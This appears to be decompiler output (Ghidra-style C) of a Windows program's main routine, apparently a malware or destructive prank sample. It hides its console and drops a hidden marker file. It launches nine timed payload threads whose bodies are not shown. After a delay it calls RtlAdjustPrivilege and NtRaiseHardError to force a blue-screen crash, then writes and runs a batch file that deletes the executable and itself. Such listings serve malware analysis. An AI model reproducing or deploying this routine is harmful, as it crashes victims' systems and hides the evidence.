
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140014e40(void)

{
  code *pcVar1;
  longlong lVar2;
  char cVar3;
  BOOL BVar4;
  HWND hWnd;
  HANDLE pvVar5;
  _LUID _Var6;
  undefined8 uVar7;
  undefined8 *puVar8;
  undefined2 *puVar9;
  undefined4 *puVar10;
  HMODULE pHVar11;
  FARPROC pFVar12;
  FARPROC pFVar13;
  longlong lVar14;
  LPCSTR ***ppppCVar15;
  _TOKEN_PRIVILEGES *p_Var16;
  char *pcVar17;
  undefined1 *puVar18;
  undefined8 uStackY_500;
  undefined1 auStackY_4f8 [8];
  undefined1 auStackY_4f0 [24];
  undefined1 local_4c8;
  undefined4 local_4c0;
  undefined4 uStack_4bc;
  _LUID local_4b8;
  undefined **local_4b0;
  undefined **local_3f8 [12];
  _TOKEN_PRIVILEGES local_398;
  undefined8 local_388;
  ulonglong local_380;
  LPCSTR **local_378;
  undefined8 uStack_370;
  undefined8 local_368;
  ulonglong uStack_360;
  undefined1 local_358;
  undefined7 uStack_357;
  undefined8 local_348;
  ulonglong local_340;
  CHAR local_338 [272];
  WCHAR local_228 [264];
  ulonglong local_18;
  
  cVar3 = DAT_14006aba5;
  puVar18 = auStackY_4f8;
  local_18 = DAT_140068100 ^ (ulonglong)auStackY_4f8;
  local_4c0 = 0;
  LOCK();
  DAT_14006aba5 = '\x01';
  UNLOCK();
  if (cVar3 == '\0') {
    hWnd = GetConsoleWindow();
    if (hWnd != (HWND)0x0) {
      ShowWindow(hWnd,0);
    }
    FreeConsole();
    SetThreadExecutionState(0x80000003);
    pvVar5 = GetCurrentProcess();
    BVar4 = OpenProcessToken(pvVar5,0x28,(PHANDLE)&local_4c0);
    if (BVar4 != 0) {
      BVar4 = LookupPrivilegeValueW((LPCWSTR)0x0,L"SeShutdownPrivilege",&local_4b8);
      pvVar5 = (HANDLE)CONCAT44(uStack_4bc,local_4c0);
      if (BVar4 != 0) {
        local_398.PrivilegeCount._0_2_ = 1;
        local_398.PrivilegeCount._2_2_ = 0;
        local_398.Privileges[0].Luid.LowPart = local_4b8.LowPart;
        local_398.Privileges[0].Luid.HighPart = local_4b8.HighPart;
        local_398.Privileges[0].Attributes = 0;
        AdjustTokenPrivileges(pvVar5,0,&local_398,0x10,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
        pvVar5 = (HANDLE)CONCAT44(uStack_4bc,local_4c0);
      }
      CloseHandle(pvVar5);
    }
    local_398.PrivilegeCount._2_2_ = 0;
    local_398.Privileges[0].Luid.LowPart = 0;
    local_398.Privileges[0].Luid.HighPart = 0;
    local_398.Privileges[0].Attributes = 0;
    local_388 = 0;
    local_380 = 7;
    local_398.PrivilegeCount._0_2_ = 0;
    local_4c0 = 2;
    FUN_14001a1a0(&local_398,0x105,local_4c8);
    p_Var16 = &local_398;
    if (7 < local_380) {
      p_Var16 = (_TOKEN_PRIVILEGES *)
                CONCAT44(local_398.Privileges[0].Luid.LowPart,
                         CONCAT22(local_398.PrivilegeCount._2_2_,
                                  (undefined2)local_398.PrivilegeCount));
    }
    _Var6 = (_LUID)FUN_140024904(p_Var16);
    local_4b8 = _Var6;
    FUN_140016170(&local_398,(ulonglong)_Var6 & 0xffffffff,0);
    local_4b8.LowPart = _Var6.HighPart;
    if (local_4b8.LowPart == 0xffffffff) {
      local_4b8.LowPart = 0x14;
      local_4b0 = &PTR_vftable_140068d68;
    }
    else {
      local_4b0 = &PTR_vftable_140068d78;
    }
    local_4b8.HighPart = local_398.Privileges[0].Luid.LowPart;
    local_4c0 = 1;
    if (local_4b8.LowPart != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000a5e0("temp_directory_path",&local_4b8,&local_398);
    }
    uVar7 = FUN_140009ad0(&local_398,&local_358);
    puVar8 = (undefined8 *)FUN_1400183c0(uVar7,"\\sfv_done.tmp",0xd);
    local_378 = (LPCSTR **)*puVar8;
    uStack_370 = puVar8[1];
    local_368 = puVar8[2];
    uStack_360 = puVar8[3];
    puVar8[2] = 0;
    puVar8[3] = 0xf;
    *(undefined1 *)puVar8 = 0;
    puVar18 = auStackY_4f8;
    if (0xf < local_340) {
      lVar2 = CONCAT71(uStack_357,local_358);
      lVar14 = lVar2;
      puVar18 = auStackY_4f8;
      if ((0xfff < local_340 + 1) &&
         (lVar14 = *(longlong *)(lVar2 + -8), puVar18 = auStackY_4f8, 0x1f < (lVar2 - lVar14) - 8U))
      {
        pcVar1 = (code *)swi(0x29);
        lVar14 = (*pcVar1)(5);
        puVar18 = auStackY_4f0;
      }
      *(undefined8 *)(puVar18 + -8) = 0x14001506a;
      FUN_140026c34(lVar14);
    }
    local_348 = 0;
    local_340 = 0xf;
    local_358 = 0;
    *(undefined8 *)(puVar18 + -8) = 0x14001508c;
    FUN_140018e20(&local_398);
    *(undefined8 *)(puVar18 + -8) = 0x1400150a3;
    uVar7 = FUN_1400163d0(puVar18 + 0x58,&local_378,2);
    *(undefined8 *)(puVar18 + -8) = 0x1400150ac;
    FUN_1400176a0(uVar7);
    *(undefined ***)(puVar18 + (longlong)*(int *)(*(longlong *)(puVar18 + 0x58) + 4) + 0x58) =
         std::basic_ofstream<>::vftable;
    *(int *)(puVar18 + (longlong)*(int *)(*(longlong *)(puVar18 + 0x58) + 4) + 0x54) =
         *(int *)(*(longlong *)(puVar18 + 0x58) + 4) + -0xa8;
    *(undefined8 *)(puVar18 + -8) = 0x1400150df;
    FUN_140017450(puVar18 + 0x60);
    *(undefined ***)(puVar18 + (longlong)*(int *)(*(longlong *)(puVar18 + 0x58) + 4) + 0x58) =
         std::basic_ostream<>::vftable;
    *(int *)(puVar18 + (longlong)*(int *)(*(longlong *)(puVar18 + 0x58) + 4) + 0x54) =
         *(int *)(*(longlong *)(puVar18 + 0x58) + 4) + -0x10;
    local_3f8[0] = std::ios_base::vftable;
    *(undefined8 *)(puVar18 + -8) = 0x140015118;
    std::ios_base::_Ios_base_dtor((ios_base *)local_3f8);
    ppppCVar15 = &local_378;
    if (0xf < uStack_360) {
      ppppCVar15 = (LPCSTR ***)local_378;
    }
    *(undefined8 *)(puVar18 + -8) = 0x14001513b;
    SetFileAttributesA((LPCSTR)ppppCVar15,6);
    *(undefined8 *)(puVar18 + -8) = 0x140015150;
    GetModuleFileNameW((HMODULE)0x0,local_228,0x104);
    *(undefined8 *)(puVar18 + -8) = 0x140015161;
    puVar9 = (undefined2 *)FUN_140028520(local_228);
    if (puVar9 != (undefined2 *)0x0) {
      *puVar9 = 0;
    }
    *(undefined8 *)(puVar18 + -8) = 0x140015176;
    SetCurrentDirectoryW(local_228);
    *(undefined8 *)(puVar18 + -8) = 0x140015180;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 0;
    *(code **)(puVar10 + 2) = FUN_14000fce0;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x1400151aa;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x1400151b4;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 2000;
    *(code **)(puVar10 + 2) = FUN_14000fe80;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x1400151e2;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x1400151ec;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 4000;
    *(code **)(puVar10 + 2) = FUN_140011b50;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x14001521a;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x140015224;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 6000;
    *(code **)(puVar10 + 2) = FUN_140011c70;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x140015252;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x14001525c;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 8000;
    *(code **)(puVar10 + 2) = FUN_140011cd0;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x14001528a;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x140015294;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 10000;
    *(code **)(puVar10 + 2) = FUN_14000f3c0;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x1400152c2;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x1400152cc;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 12000;
    *(code **)(puVar10 + 2) = FUN_140014da0;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x1400152fa;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x140015304;
    puVar10 = (undefined4 *)FUN_1400269b0();
    *puVar10 = 14000;
    *(code **)(puVar10 + 2) = FUN_140011aa0;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x140015332;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x14001533c;
    puVar10 = (undefined4 *)FUN_1400269b0(0x10);
    *puVar10 = 16000;
    *(code **)(puVar10 + 2) = FUN_140011a70;
    *(undefined8 *)(puVar18 + 0x28) = 0;
    *(undefined4 *)(puVar18 + 0x20) = 0;
    *(undefined8 *)(puVar18 + -8) = 0x14001536a;
    CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_14000f370,puVar10,*(DWORD *)(puVar18 + 0x20),
                 *(LPDWORD *)(puVar18 + 0x28));
    *(undefined8 *)(puVar18 + -8) = 0x140015375;
    Sleep(75000);
    *(undefined8 *)(puVar18 + -8) = 0x140015382;
    pHVar11 = LoadLibraryW(L"ntdll");
    *(undefined8 *)(puVar18 + -8) = 0x140015392;
    pFVar12 = GetProcAddress(pHVar11,"NtRaiseHardError");
    *(undefined8 *)(puVar18 + -8) = 0x1400153a2;
    pHVar11 = LoadLibraryW(L"ntdll");
    pcVar17 = "RtlAdjustPrivilege";
    *(undefined8 *)(puVar18 + -8) = 0x1400153b2;
    pFVar13 = GetProcAddress(pHVar11,"RtlAdjustPrivilege");
    *(undefined8 *)(puVar18 + -8) = 0x1400153c3;
    (*pFVar13)(0x13,CONCAT71((int7)((ulonglong)pcVar17 >> 8),1),0,puVar18 + 0x30);
    *(undefined1 **)(puVar18 + 0x28) = puVar18 + 0x50;
    *(undefined4 *)(puVar18 + 0x20) = 6;
    *(undefined8 *)(puVar18 + -8) = 0x1400153e4;
    (*pFVar12)(0xdeaddead,0,0,0);
    *(undefined8 *)(puVar18 + -8) = 0x1400153f9;
    GetModuleFileNameA((HMODULE)0x0,local_338,0x104);
    *(undefined8 *)(puVar18 + -8) = 0x14001540c;
    lVar14 = FUN_14002c42c("C:\\Windows\\Temp\\clean.bat",&DAT_14005c4fc);
    if (lVar14 != 0) {
      *(undefined8 *)(puVar18 + -8) = 0x140015423;
      FUN_140008680(lVar14,"@echo off\n");
      *(undefined8 *)(puVar18 + -8) = 0x140015432;
      FUN_140008680(lVar14,"timeout /t 3 >nul\n");
      *(undefined8 *)(puVar18 + -8) = 0x140015448;
      FUN_140008680(lVar14,"del \"%s\"\n",local_338);
      *(undefined8 *)(puVar18 + -8) = 0x140015457;
      FUN_140008680(lVar14,"del \"%%~f0\"\n");
      *(undefined8 *)(puVar18 + -8) = 0x14001545f;
      FUN_14002cc98(lVar14);
      *(undefined8 *)(puVar18 + -8) = 0x14001546d;
      FUN_14000ff20("call \"C:\\Windows\\Temp\\clean.bat\"",0);
    }
    if (0xf < uStack_360) {
      ppppCVar15 = (LPCSTR ***)local_378;
      if ((0xfff < uStack_360 + 1) &&
         (ppppCVar15 = (LPCSTR ***)local_378[-1],
         (LPCSTR)0x1f < (LPCSTR)((longlong)local_378 + (-8 - (longlong)ppppCVar15)))) {
        pcVar1 = (code *)swi(0x29);
        ppppCVar15 = (LPCSTR ***)(*pcVar1)(5);
        puVar18 = puVar18 + 8;
      }
      *(undefined8 *)(puVar18 + -8) = 0x1400154b4;
      FUN_140026c34(ppppCVar15);
    }
  }
  *(undefined8 *)(puVar18 + -8) = 0x1400154c3;
  return;
}

